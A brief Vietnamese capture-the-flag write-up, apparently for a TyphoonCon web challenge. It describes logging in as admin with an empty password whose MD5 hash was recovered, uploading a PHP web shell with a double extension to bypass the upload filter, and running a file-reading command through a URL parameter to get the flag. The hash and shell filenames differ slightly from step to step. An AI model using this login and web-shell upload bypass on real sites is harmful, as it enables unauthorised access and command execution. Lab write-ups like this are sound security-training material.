# Solution

Viết script để tìm md5 hash của admin -> `d41d8cd98f00b204e9800998ecf827e` 


Dùng trang này <https://md5.gromweb.com/?md5=d41d8cd98f00b204e9800998ecf8427e> -> password là null chỉ cần `POST /login.php` với data: `uname=admin&pswd=`


Sau khi vào được trang upload.php ta upload một php shell với tên là `shell.png.php` để bypass check

sau đó access tới: `https://typhooncon-knowme.chals.io/uploads/exp.jpg.php?0=cat ../../flag`

ra được flag: `SSD{9a0c843a03de8e257b1068a8659be56ac06991f3}`